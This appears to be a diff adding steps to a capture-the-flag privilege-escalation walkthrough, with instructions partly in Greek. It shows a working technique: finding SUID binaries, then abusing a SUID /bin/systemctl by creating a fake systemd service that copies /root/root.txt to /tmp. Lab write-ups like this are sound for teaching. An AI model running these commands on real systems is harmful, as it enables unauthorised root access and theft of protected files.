@@ -5,3 +5,28 @@ You just got a www-data shell :)
 
 2. find / -user root -perm -4000 2>/dev/null
 
+
+3. You found /bin/systemctl running SUID
+Δημιούργησε ένα script για να αντιγράψει το /root/root.txt:
+
+echo "/bin/cp /root/root.txt /tmp/root.txt" > /tmp/copy.sh
+chmod +x /tmp/copy.sh
+
+cat <<EOF > /tmp/fake.service
+[Unit]
+Description=Fake Service
+
+[Service]
+Type=oneshot
+ExecStart=/tmp/copy.sh
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+Τρέξε το service χρησιμοποιώντας το SUID systemctl:
+/bin/systemctl link /tmp/fake.service
+/bin/systemctl enable --now fake.service
+
+Δες αν το /tmp/root.txt δημιουργήθηκε:
+cat /tmp/root.txt
